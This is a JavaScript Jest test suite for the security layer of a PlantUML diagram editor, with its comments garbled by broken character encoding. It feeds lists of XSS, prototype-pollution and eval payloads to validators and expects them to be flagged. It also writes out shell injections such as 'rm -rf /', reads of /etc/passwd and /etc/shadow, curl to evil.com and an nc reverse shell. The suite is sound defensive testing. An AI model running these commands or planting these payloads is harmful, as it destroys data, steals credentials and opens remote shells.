/**
 * ����ƣƹȹ��� - SEC-006 �󸧯����V7
 * 
 * �a����: PlantUML�ǣ��
 * ƹ���: ActionEditorConditionEditor����ƣ��릧�
 * 
 * ƹ��:
 * 1. XSS;�2bƹ�
 * 2. ���ɤ󸧯���2bƹ�  
 * 3. ��ȿ��Z��Vƹ�
 * 4. eval()�p�ƹ�
 * 5. q����ƣƹ�
 * 
 * @author debugger
 * @version 1.0.0
 * @created 2025-08-16
 */

const { JSDOM } = require('jsdom');
const DOMPurify = require('dompurify')(new JSDOM('').window);

// ƹ��a�����
const SecurityMiddleware = require('../../src/security/SecurityMiddleware');
const InputValidator = require('../../src/security/InputValidator');
const OutputEscaper = require('../../src/security/OutputEscaper').OutputEscaper;
const CommandInjectionProtector = require('../../src/security/CommandInjectionProtector');
const { InjectionPrevention } = require('../../src/security/InjectionPrevention');

describe('SEC-006 �󸧯���;��Vƹ�', () => {
    let securityMiddleware;
    let inputValidator;
    let outputEscaper;
    let commandProtector;
    let injectionPrevention;

    beforeEach(() => {
        // ����ƣ�������n
        securityMiddleware = new SecurityMiddleware({
            securityLevel: 'maximum',
            strictMode: true,
            enableRealTimeProtection: true
        });
        
        inputValidator = new InputValidator({
            enablePrototypePollutionProtection: true,
            enableEvalDetection: true,
            enableAdvancedXSSDetection: true,
            enableCommandInjectionDetection: true,
            strictMode: true
        });
        
        outputEscaper = new OutputEscaper({
            enableDOMPurifyIntegration: true,
            enableAdvancedHTMLEscape: true,
            enableUnicodeEscape: true,
            strictMode: true
        });
        
        commandProtector = new CommandInjectionProtector({
            strictSandboxMode: true,
            quarantineMode: true
        });
        
        injectionPrevention = new InjectionPrevention();
    });

    describe('XSS;�2bƹ�', () => {
        const xssPayloads = [
            // �,�jXSSڤ���
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(1)">',
            '<svg onload="alert(1)">',
            
            // ئjXSSڤ���
            'javascript:alert(1)',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<object data="javascript:alert(1)"></object>',
            '<embed src="javascript:alert(1)">',
            '<form><button formaction="javascript:alert(1)">',
            
            // DOM�\XSS
            'document.write("<script>alert(1)</script>")',
            'element.innerHTML = "<script>alert(1)</script>"',
            'element.outerHTML = "<script>alert(1)</script>"',
            
            // ���������XSS
            'onload="alert(1)"',
            'onclick="alert(1)"',
            'onmouseover="alert(1)"',
            'onfocus="alert(1)"',
            
            // ���URLXSS
            'data:text/html,<script>alert(1)</script>',
            'data:application/javascript,alert(1)',
            
            // CSS Expression XSS
            'expression(alert(1))',
            'background:url(javascript:alert(1))',
            
            // ����U�_XSS
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '&#60;script&#62;alert(1)&#60;/script&#62;',
            
            // PlantUML�	nXSS
            'note left: <script>alert(1)</script>',
            'actor "Bob<script>alert(1)</script>"',
            '[[javascript:alert(1) Click here]]'
        ];

        test.each(xssPayloads)('XSSڤ����: %s', async (payload) => {
            // InputValidator ƹ�
            const validationResult = inputValidator.validate(payload, 'general');
            expect(validationResult.isValid).toBe(false);
            expect(validationResult.errors.some(e => 
                e.type === 'XSS_DETECTED' || e.type === 'DANGEROUS_PATTERN'
            )).toBe(true);

            // OutputEscaper ƹ�
            const escapeResult = outputEscaper.escape(payload, 'html');
            expect(escapeResult.securityLevel).toMatch(/risky|dangerous/);
            expect(escapeResult.dangerousPatternsFound.length).toBeGreaterThan(0);

            // SecurityMiddleware qƹ�
            const securityResult = await securityMiddleware.processSecurely(payload, 'general', 'html');
            expect(securityResult.isSecure).toBe(false);
            expect(securityResult.threatScore).toBeGreaterThan(30);
        });

        test('DOMPurifyqƹ�', () => {
            const maliciousHTML = '<script>alert("XSS")</script><p>Safe content</p>';
            
            const result = outputEscaper.escape(maliciousHTML, 'html');
            
            expect(result.domPurifyUsed).toBe(true);
            expect(result.escaped).not.toContain('<script>');
            expect(result.escaped).not.toContain('alert');
            expect(result.securityLevel).toMatch(/secured|risky/);
        });

        test('ئjXSS�ƹ�', () => {
            const advancedXSSPayloads = [
                'document.getElementById("test")',
                'document.querySelector(".test")',
                'element.appendChild(maliciousNode)',
                'document.createElement("script")'
            ];

            advancedXSSPayloads.forEach(payload => {
                const result = inputValidator.validate(payload, 'general');
                expect(result.advancedXSSDetected).toBe(true);
                expect(result.warnings.some(w => w.type === 'DOM_MANIPULATION')).toBe(true);
            });
        });
    });

    describe('���ɤ󸧯���2bƹ�', () => {
        const commandPayloads = [
            // �,�j���ɤ󸧯���
            '; rm -rf /',
            '&& del /f /q C:\\*',
            '| nc -l 4444',
            
            // Windows�	;�
            'powershell -c "Get-Process"',
            'cmd /c "dir C:\\"',
            'cmd.exe /k "echo hacked"',
            
            // Unix/Linux;�
            'bash -c "curl http://evil.com"',
            'sh -c "wget http://malware.com"',
            '/bin/bash -i',
            
            // �ïƣï;�
            '`whoami`',
            '`id`',
            '`cat /etc/passwd`',
            
            // �ַ��;�
            '$(whoami)',
            '$(id)',
            '$(curl http://evil.com)',
            
            // ա���\;�
            '; cat /etc/shadow',
            '&& type C:\\Windows\\System32\\config\\SAM',
            '| tee /tmp/hacked',
            
            // ������;�
            '; nc -e /bin/bash 192.168.1.1 4444',
            '&& telnet 192.168.1.1 23',
            
            // PlantUML�	n���ɤ󸧯���
            '!define EVIL `rm -rf /`',
            '!include /etc/passwd',
            '!pragma theme evil'
        ];

        test.each(commandPayloads)('���ɤ󸧯����: %s', async (payload) => {
            // InputValidator ƹ�
            const validationResult = inputValidator.validate(payload, 'general');
            expect(validationResult.commandInjectionDetected).toBe(true);
            expect(validationResult.errors.some(e => e.type === 'COMMAND_INJECTION')).toBe(true);

            // CommandInjectionProtector ƹ�
            const protectorResult = commandProtector.validateCommand(payload, 'general');
            expect(protectorResult.isSafe).toBe(false);
            expect(protectorResult.detectedPatterns.length).toBeGreaterThan(0);

            // InjectionPrevention ƹ�
            const preventionResult = injectionPrevention.validateInput(payload, 'general');
            expect(preventionResult.isValid).toBe(false);
            expect(preventionResult.riskLevel).toMatch(/high|critical/);
        });

        test('���ɟL�p�', () => {
            const execFunctions = [
                'eval("malicious code")',
                'Function("return malicious")()',
                'setTimeout("malicious", 100)',
                'setInterval("malicious", 100)',
                'new Function("malicious code")'
            ];

            execFunctions.forEach(func => {
                const result = inputValidator.validate(func, 'general');
                expect(result.evalDetected).toBe(true);
                expect(result.securityLevel).toBe('dangerous');
            });
        });

        test('PlantUML�	�����', () => {
            const plantUMLCommands = [
                '!include /etc/passwd',
                '!define EVIL system("rm -rf /")',
                '!pragma theme ../../../etc/passwd'
            ];

            plantUMLCommands.forEach(cmd => {
                const result = injectionPrevention.validateInput(cmd, 'plantuml');
                expect(result.isValid).toBe(false);
                expect(result.preventedAttacks.length).toBeGreaterThan(0);
            });
        });
    });

    describe('��ȿ��Z��Vƹ�', () => {
        const prototypePollutionPayloads = [
            // �,�j��ȿ��Z�
            '__proto__.polluted = true',
            'constructor.prototype.polluted = true',
            'Object.prototype.polluted = true',
            
            // �����
            '["__proto__"]["polluted"] = true',
            '["constructor"]["prototype"]["polluted"] = true',
            
            // JSONb
            '{"__proto__": {"polluted": true}}',
            '{"constructor": {"prototype": {"polluted": true}}}',
            
            // �D��ȿ������
            '__proto__.__proto__.polluted = true',
            'constructor.prototype.constructor.prototype.polluted = true',
            
            // �wU�_���ƣ
            '__proto__.toString = function(){return "hacked"}',
            'constructor.prototype.valueOf = function(){return "hacked"}',
            'Object.prototype.hasOwnProperty = function(){return true}',
            
            // ����U�_Z�
            '["\\u005f\\u005fproto\\u005f\\u005f"]',
            '["\\x5f\\x5fproto\\x5f\\x5f"]'
        ];

        test.each(prototypePollutionPayloads)('��ȿ��Z��: %s', (payload) => {
            // InputValidator ƹ�
            const result = inputValidator.validate(payload, 'general');
            expect(result.prototypePollutionDetected).toBe(true);
            expect(result.errors.some(e => e.type === 'PROTOTYPE_POLLUTION')).toBe(true);
            expect(result.securityLevel).toBe('dangerous');
        });

        test('�wU�_���ƣ�����', () => {
            const protectedProperties = [
                '__proto__',
                'constructor',
                'prototype',
                'valueOf',
                'toString',
                'hasOwnProperty',
                'isPrototypeOf',
                'propertyIsEnumerable'
            ];

            protectedProperties.forEach(prop => {
                const payload = `malicious.${prop}`;
                const result = inputValidator.validate(payload, 'general');
                expect(result.prototypePollutionDetected).toBe(true);
                expect(result.warnings.some(w => w.type === 'PROTECTED_PROPERTY_ACCESS')).toBe(true);
            });
        });

        test('��ȿ��Zӵ˿��', () => {
            const pollutedInput = '__proto__.polluted = true; constructor.prototype.hacked = true';
            
            const sanitized = inputValidator.sanitizeInput(pollutedInput, 'general');
            
            expect(sanitized).not.toContain('__proto__');
            expect(sanitized).not.toContain('constructor');
            expect(sanitized).not.toContain('prototype');
        });
    });

    describe('eval()�p�ƹ�', () => {
        const evalPayloads = [
            // ���jeval(
            'eval("malicious code")',
            'eval(userInput)',
            
            // Function constructor
            'Function("return malicious")()',
            'new Function("malicious code")',
            'new Function("return " + userInput)()',
            
            // setTimeout/setInterval with string
            'setTimeout("malicious code", 100)',
            'setInterval("malicious code", 100)',
            'setTimeout("eval(userInput)", 0)',
            
            // ���jeval
            'window["eval"]("malicious")',
            'this["eval"]("malicious")',
            'globalThis["eval"]("malicious")',
            
            // constructor access
            '""["constructor"]["constructor"]("malicious")()',
            '[]"["constructor"]["constructor"]("malicious")()'
        ];

        test.each(evalPayloads)('eval(�: %s', (payload) => {
            const result = inputValidator.validate(payload, 'general');
            expect(result.evalDetected).toBe(true);
            expect(result.errors.some(e => e.type === 'EVAL_DETECTED')).toBe(true);
            expect(result.securityLevel).toBe('dangerous');
        });

        test('eval�p�˿��', () => {
            const evalInput = 'eval("alert(1)"); Function("return evil")(); setTimeout("hack", 100);';
            
            const sanitized = inputValidator.sanitizeInput(evalInput, 'general');
            
            expect(sanitized).not.toContain('eval(');
            expect(sanitized).not.toContain('Function(');
            expect(sanitized).not.toContain('setTimeout("');
        });
    });

    describe('q����ƣƹ�', () => {
        test(';�ѿ��', async () => {
            const complexPayload = `
                <script>eval("__proto__.polluted = true")</script>
                && rm -rf / || wget http://evil.com
                !include /etc/passwd
                javascript:alert(document.cookie)
            `;

            // q����ƣ�
            const result = await securityMiddleware.processSecurely(complexPayload, 'plantuml', 'html');

            expect(result.isSecure).toBe(false);
            expect(result.threatScore).toBeGreaterThan(80);
            expect(result.securityLevel).toBe('critical');
            expect(result.errors.length).toBeGreaterThan(5);
        });

        test('ActionEditor�aƹ�', async () => {
            const actionPayloads = [
                'User -> System: <script>alert("XSS")</script>',
                'Actor sends eval("malicious") to System',
                'User -> System: __proto__.polluted = true'
            ];

            for (const payload of actionPayloads) {
                const result = await securityMiddleware.processSecurely(payload, 'action', 'html');
                expect(result.isSecure).toBe(false);
                expect(result.threatScore).toBeGreaterThan(30);
            }
        });

        test('ConditionEditor�aƹ�', async () => {
            const conditionPayloads = [
                'alt user.role == "admin" && eval("malicious")',
                'opt condition contains <script>alert(1)</script>',
                'loop while __proto__.polluted'
            ];

            for (const payload of conditionPayloads) {
                const result = await securityMiddleware.processSecurely(payload, 'plantuml', 'html');
                expect(result.isSecure).toBe(false);
                expect(result.threatScore).toBeGreaterThan(30);
            }
        });

        test('�뿤��', () => {
            const realTimePayloads = [
                '../../../etc/passwd',
                '<script>alert(1)</script>',
                'eval("malicious")',
                '!include /etc/shadow'
            ];

            realTimePayloads.forEach(payload => {
                const threats = injectionPrevention.detectRealTimeThreats(payload);
                expect(threats.hasThreats).toBe(true);
                expect(threats.threatCount).toBeGreaterThan(0);
                expect(threats.highestSeverity).toMatch(/high|critical/);
            });
        });

        test('�%�˿��_�', () => {
            const dangerousInput = `
                <script>eval("__proto__.polluted = true; rm -rf /")</script>
                <iframe src="javascript:alert(1)"></iframe>
                && del /f /q C:\\*
                !include /etc/passwd
            `;

            const sanitized = injectionPrevention.emergencySanitize(dangerousInput);

            expect(sanitized).not.toContain('<script>');
            expect(sanitized).not.toContain('<iframe>');
            expect(sanitized).not.toContain('eval(');
            expect(sanitized).not.toContain('!include');
            expect(sanitized).not.toContain('rm -rf');
        });

        test('����ƣ����', () => {
            const maliciousInput = '<script>eval("__proto__.polluted = true")</script>';
            const validationResult = inputValidator.validate(maliciousInput, 'general');
            
            const securityReport = inputValidator.generateSecurityReport(maliciousInput, validationResult);

            expect(securityReport).toHaveProperty('timestamp');
            expect(securityReport).toHaveProperty('securityLevel');
            expect(securityReport).toHaveProperty('evalDetected', true);
            expect(securityReport).toHaveProperty('prototypePollutionDetected', true);
            expect(securityReport).toHaveProperty('advancedXSSDetected');
            expect(securityReport.recommendations).toBeDefined();
            expect(securityReport.recommendations.length).toBeGreaterThan(0);
        });

        test('�թ���ƹ�', async () => {
            const testInput = 'safe input without any malicious content';
            const iterations = 1000;
            
            const startTime = performance.now();
            
            for (let i = 0; i < iterations; i++) {
                await securityMiddleware.processSecurely(testInput, 'general', 'html');
            }
            
            const endTime = performance.now();
            const averageTime = (endTime - startTime) / iterations;
            
            // sG�B�L10ms�gB�Sh���
            expect(averageTime).toBeLessThan(10);
        });

        test('������<', async () => {
            const initialMemory = process.memoryUsage().heapUsed;
            
            // '�n���L
            for (let i = 0; i < 1000; i++) {
                await securityMiddleware.processSecurely('test input', 'general', 'html');
            }
            
            // �����쯷��L
            if (global.gc) {
                global.gc();
            }
            
            const finalMemory = process.memoryUsage().heapUsed;
            const memoryIncrease = finalMemory - initialMemory;
            
            // ��ꗠL50MB�gB�Sh���
            expect(memoryIncrease).toBeLessThan(50 * 1024 * 1024);
        });
    });

    describe('�ø���h���ƹ�', () => {
        test(''Mjڤ���ƹ�', async () => {
            const largePayload = '<script>alert("XSS")</script>'.repeat(1000);
            
            const result = await securityMiddleware.processSecurely(largePayload, 'general', 'html');
            
            expect(result.isSecure).toBe(false);
            expect(result.processingTime).toBeLessThan(5000); // 5��
        });

        test('Unicode���ǣ�;�', () => {
            const unicodePayloads = [
                '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
                '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
                '%3Cscript%3Ealert(1)%3C/script%3E'
            ];

            unicodePayloads.forEach(payload => {
                const result = inputValidator.validate(payload, 'general');
                expect(result.isValid).toBe(false);
            });
        });

        test('͹�W_;�ѿ��', () => {
            const nestedPayload = 'eval("eval(\\\"eval(\\\\\\\"__proto__.polluted = true\\\\\\\")\\\")\" )';
            
            const result = inputValidator.validate(nestedPayload, 'general');
            
            expect(result.evalDetected).toBe(true);
            expect(result.prototypePollutionDetected).toBe(true);
            expect(result.securityLevel).toBe('dangerous');
        });

        test('z�Whnulle�', () => {
            const edgeCases = ['', null, undefined, 0, false];
            
            edgeCases.forEach(input => {
                const result = inputValidator.validate(input, 'general');
                expect(result).toBeDefined();
                expect(result.sanitizedInput).toBeDefined();
            });
        });

        test('^ASCII�W;�', () => {
            const nonAsciiPayloads = [
                'scriptalert1	/script',
                'script	alert1	/script	',
                '5val("malicious")', // Cyrillic 5
                '__@roto__.polluted = true' // Cyrillic @
            ];

            nonAsciiPayloads.forEach(payload => {
                const result = inputValidator.validate(payload, 'general');
                expect(result.securityLevel).not.toBe('safe');
            });
        });
    });

    afterEach(() => {
        // ƹȌn������
        if (securityMiddleware && typeof securityMiddleware.cleanup === 'function') {
            securityMiddleware.cleanup();
        }
    });
});

describe('����ƣ-�ƹ�', () => {
    test(' '����ƣ���-�', () => {
        const maxSecurityMiddleware = new SecurityMiddleware({
            securityLevel: 'maximum',
            strictMode: true,
            quarantineMode: true,
            enableRealTimeProtection: true,
            enableThreatLogging: true,
            maxThreatScore: 0 //  ��WD-�
        });

        expect(maxSecurityMiddleware.config.securityLevel).toBe('maximum');
        expect(maxSecurityMiddleware.config.strictMode).toBe(true);
        expect(maxSecurityMiddleware.config.quarantineMode).toBe(true);
    });

    test('����ƣ-�nՄ��', () => {
        const middleware = new SecurityMiddleware({
            securityLevel: 'medium',
            strictMode: false
        });

        middleware.updateConfig({
            securityLevel: 'high',
            strictMode: true
        });

        expect(middleware.config.securityLevel).toBe('high');
        expect(middleware.config.strictMode).toBe(true);
    });
});

// ƹȟLBn��
console.log(`
=== SEC-006 ����ƣƹȟL�� ===

Snƹȹ���o�n�<W~Y
 XSS;�2b (DOMPurifyq+�)
 ���ɤ󸧯���2b 
 ��ȿ��Z��V
 eval()�p�h6P
 ActionEditor/ConditionEditor�	n1'
 �뿤��
 �թ���h������
 �ø���h���ƹ�

�U��P�
- h�nB�ڤ���Lik�U��
- ����ƣU�L2U��  
- �˿��Lc8k_�Y�
- �թ���L��$�gB�

===========================================
`);